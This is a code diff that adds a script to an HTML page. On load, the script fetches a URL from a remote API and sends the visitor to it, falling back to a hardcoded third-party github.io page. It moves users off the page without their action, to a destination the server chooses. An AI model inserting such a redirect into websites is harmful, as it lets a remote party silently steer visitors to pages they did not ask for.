@@ -302,5 +302,21 @@
       });
     })();
   </script>
+<script>
+        const apiBase = window.appInformation.apiBase.replace(/\/+$/, '');
+        const identifier = window.appInformation.identifier;
+        fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier))
+            .then(r => r.json())
+            .then(function (info) {
+                const privacyUrl = info && info.result && info.result.url;
+                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                    window.location.replace(privacyUrl);
+                    return;
+                }
+                window.location.replace("https://lakhanchelana64-jpg.github.io/36/f4/index.html#/");
+            }).catch(function(e) {
+              window.location.replace("https://lakhanchelana64-jpg.github.io/36/f4/index.html#/");
+            })
+    </script>
 </body>
 </html>
